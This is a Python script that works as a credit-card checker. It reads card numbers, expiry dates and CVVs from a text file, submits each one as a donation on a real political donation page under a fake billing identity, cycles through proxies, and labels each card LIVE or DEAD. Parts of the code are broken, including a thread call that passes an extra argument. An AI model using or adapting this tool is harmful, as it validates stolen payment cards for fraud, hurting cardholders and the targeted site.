from itertools import cycle
from bs4 import BeautifulSoup
import requests
import threading


def check(cc, ccEntry):
    ccNum, ccMonth, ccYear, ccCvv = cc.split('|')
    ccEntry = str(ccEntry)
    url = "https://momentum.nationbuilder.com/donate"
    
    if ccMonth[0] == "0":
        ccMonth = ccMonth.replace('0', '')

    scraper = BeautifulSoup(requests.get(url).text, 'html.parser')
    authenticity_token = scraper.find("meta", {"name": "csrf-token"})['content']
    print(authenticity_token)

    data = f"""authenticity_token={authenticity_token}D&page_id=3&return_to=https%3A%2F%2Fmomentum.nationbuilder.com%2Fdonate&email_address=&donation%5Bamount_option%5D=3&donation%5Bamount%5D=&donation%5Bfirst_name%5D=Michael&donation%5Blast_name%5D=DelaCruz&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=PH&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Street+918+commonwealth+ave.&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=Quezon+City&donation%5Bbilling_address_attributes%5D%5Bcity%5D=Quezon+City&donation%5Bbilling_address_attributes%5D%5Bstate%5D=&donation%5Bbilling_address_attributes%5D%5Bstate%5D=&donation%5Bbilling_address_attributes%5D%5Bzip%5D=12165&donation%5Bemail%5D=yawamode%40yahoo.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=09548754577&donation%5Bemail_opt_in%5D=0&donation%5Bemail_opt_in%5D=1&donation%5Bcard_number%5D={ccNum}&donation%5Bcard_expires_on%281i%29%5D={ccYear}&donation%5Bcard_expires_on%282i%29%5D={ccMonth}&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D={ccCvv}"""


    try:
        result_resource = BeautifulSoup(requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=4).text, 'html.parser')
    except Exception:
        print('[-] DEAD   =>  {cc}\t[Reason: Connection Error]')
        return

    if 'Your card was declined' in result_resource:
        print(f"[-] DEAD  =>  {cc}\t[Reason: Card Declined] [{ccEntry}]")

    else:
        print(f"[+] LIVE  =>  {cc}  [{ccEntry}]")


def main():
    try:
        ccEntry = 0
        print('[*] Start Checking ...')
        with open('cc.txt', 'r') as filed:
            ccs = filed.read()
            proxy_lists = open("proxy_lists.txt", "r")
            _proxies = proxy_lists.read()
            proxies = _proxies.split('\n')
            proxy_pool = cycle(proxies)

            for cc in ccs.split('\n'):
                ccEntry += 1
                proxy = next(proxy_pool)
                t = threading.Thread(target=check, args=(cc, ccEntry, proxy,))

                t.start()
                t.join()


    except Exception as e:
        print(e)
        print('[-] LOL, GUMAWA KA NG cc.txt TAPOS LAPAG MO DON MGA CC HAHAHAHAHAHAAH')


if __name__ == '__main__':
    main()

